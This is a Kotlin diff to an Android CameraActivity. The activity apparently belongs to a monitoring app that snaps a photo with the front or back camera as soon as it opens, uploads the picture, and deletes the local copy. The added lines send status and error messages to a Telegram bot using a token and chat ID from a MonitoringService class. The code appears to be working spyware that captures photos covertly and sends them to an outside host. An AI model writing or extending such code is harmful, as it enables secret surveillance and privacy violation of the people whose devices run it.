@@ -16,6 +16,7 @@ import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.File
 import java.util.concurrent.TimeUnit
 
@@ -32,14 +33,27 @@ class CameraActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        sendDebug("🟢 CameraActivity OPENED")
         val isBack = intent.getBooleanExtra(EXTRA_BACK, true)
         takePhotoAndFinish(isBack)
+    }
+
+    private fun sendDebug(msg: String) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendMessage"
+                val json = """{"chat_id":"${MonitoringService.CHAT_ID}","text":"$msg"}"""
+                val body = json.toRequestBody("application/json".toMediaType())
+                client.newCall(Request.Builder().url(url).post(body).build()).execute()
+            } catch (_: Exception) {}
+        }
     }
 
     private fun takePhotoAndFinish(isBack: Boolean) {
         val future = ProcessCameraProvider.getInstance(this)
         future.addListener({
             try {
+                sendDebug("🟡 CameraProvider OK")
                 val provider = future.get()
                 val selector = CameraSelector.Builder()
                     .requireLensFacing(
@@ -51,6 +65,7 @@ class CameraActivity : AppCompatActivity() {
                     .build()
                 provider.unbindAll()
                 provider.bindToLifecycle(this, selector, imageCapture)
+                sendDebug("🟡 Camera bound")
 
                 val file = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                 val options = ImageCapture.OutputFileOptions.Builder(file).build()
@@ -59,16 +74,17 @@ class CameraActivity : AppCompatActivity() {
                     ContextCompat.getMainExecutor(this),
                     object : ImageCapture.OnImageSavedCallback {
                         override fun onImageSaved(result: ImageCapture.OutputFileResults) {
+                            sendDebug("🟢 Photo saved, sending...")
                             sendAndFinish(file)
                         }
                         override fun onError(exception: ImageCaptureException) {
-                            Log.e("CameraActivity", "Error", exception)
+                            sendDebug("🔴 Camera error: ${exception.message}")
                             finish()
                         }
                     }
                 )
             } catch (e: Exception) {
-                Log.e("CameraActivity", "Camera error", e)
+                sendDebug("🔴 Camera exception: ${e.message}")
                 finish()
             }
         }, ContextCompat.getMainExecutor(this))
@@ -84,8 +100,9 @@ class CameraActivity : AppCompatActivity() {
                     .build()
                 client.newCall(Request.Builder().url(url).post(body).build()).execute()
                 file.delete()
+                sendDebug("🟢 Photo sent!")
             } catch (e: Exception) {
-                Log.e("CameraActivity", "Send error", e)
+                sendDebug("🔴 Send error: ${e.message}")
             }
             runOnUiThread { finish() }
         }
